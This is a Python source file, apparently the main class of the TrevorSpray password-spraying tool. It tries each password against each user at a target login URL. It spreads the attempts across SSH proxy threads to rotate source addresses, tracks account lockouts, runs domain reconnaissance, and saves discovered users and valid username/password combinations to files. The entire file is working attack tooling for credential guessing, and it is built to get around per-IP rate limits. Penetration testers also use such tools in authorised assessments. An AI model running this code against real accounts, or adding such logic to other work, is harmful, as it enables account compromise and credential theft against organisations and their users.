import time
import logging
import requests
import importlib
import threading
from . import util
from pathlib import Path
from .proxy import ProxyThread
from .discover import DomainDiscovery
from lib.sprayers.base import BaseSprayModule

log = logging.getLogger('trevorspray.sprayer')


class TrevorSpray:

    def __init__(self, options):

        self.options = options

        self.lockout_counter = 0
        self.lockout_question = False

        self.sprayed_counter = 0

        self.home = Path.home() / '.trevorspray'
        self.home.mkdir(exist_ok=True)

        self.proxies = []
        if options.ssh:
            threads = options.ssh + ([] if options.no_current_ip else [None])
        else:
            threads = [None] * options.threads
        for i,ssh_host in enumerate(threads):
            self.proxies.append(
                ProxyThread(
                    trevor=self,
                    host=ssh_host,
                    proxy_port=options.base_port+i,
                    daemon=True
                )
            )

        spray_modules = importlib.import_module(f'lib.sprayers.{options.module}')
        for m in spray_modules.__dict__.keys():
            spray_module = getattr(spray_modules, m)
            try:
                if spray_module.__base__ == BaseSprayModule:
                    self.sprayer = spray_module(trevor=self)
                    break
            except AttributeError:
                continue

        self.existent_users_file = str(self.home / 'existent_users.txt')
        self.valid_logins_file = str(self.home / 'valid_logins.txt')
        self.tried_logins_file = str(self.home / 'tried_logins.txt')
        self.existent_users = []
        self.valid_logins = []
        self.tried_logins = util.read_file(
            self.tried_logins_file,
            key=lambda x: x.startswith(self.sprayer.id)
        )

        self.lock = threading.Lock()
        self._stop = False

    def go(self):

        try:

            self.start()

            if self.options.recon:
                for domain in self.options.recon:
                    discovery = DomainDiscovery(domain)
                    discovery.recon()
                    '''
                    consider = 'You can also try:\n'
                    for suggestion in discovery.suggest():
                        consider += f' - {suggestion}\n'
                    log.info(consider)
                    '''

            if (self.options.passwords and self.options.users):
                log.info(f'Spraying {len(self.options.users):,} users against {self.options.url} at {time.ctime()}')
                self.spray()

                log.info(f'Finished spraying {len(self.options.users):,} users against {self.options.url} at {time.ctime()}')
                for success in self.valid_logins:
                    log.success(success)

        finally:
            self.stop()


    def spray(self):

        ready = False
        try:
            ready = self.sprayer.initialize()
        except Exception as e:
            log.error(f'Unhandled error in {self.sprayer.__class__.__name__}.initialize(): {e}')
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())

        if not ready:
            log.error(f'Failed to initialize {self.sprayer.__class__.__name__}')
            return

        for password in self.options.passwords:
            for user in self.options.users:
                accepted = False
                while not accepted:
                    for proxy in self.proxies:
                        accepted = proxy.submit(user, password)
                        if accepted:
                            break
                    if not accepted:
                        time.sleep(.1)

        # wait until finished
        while not all([not proxy.running for proxy in self.proxies]):
            log.verbose('Waiting for proxy threads to finish')
            time.sleep(1)


    def start(self):

        for proxy in self.proxies:
            if proxy is not None:
                proxy.start()

    def stop(self):

        self._stop = True
        # write valid users
        util.update_file(self.existent_users_file, self.existent_users)
        log.info(f'{len(self.existent_users):,} valid users written to {self.existent_users_file}')
        # write attempted logins
        util.update_file(self.tried_logins_file, self.tried_logins)
        # write valid logins
        util.update_file(self.valid_logins_file, self.valid_logins)
        log.info(f'{len(self.valid_logins):,} valid user/pass combos written to {self.valid_logins_file}')
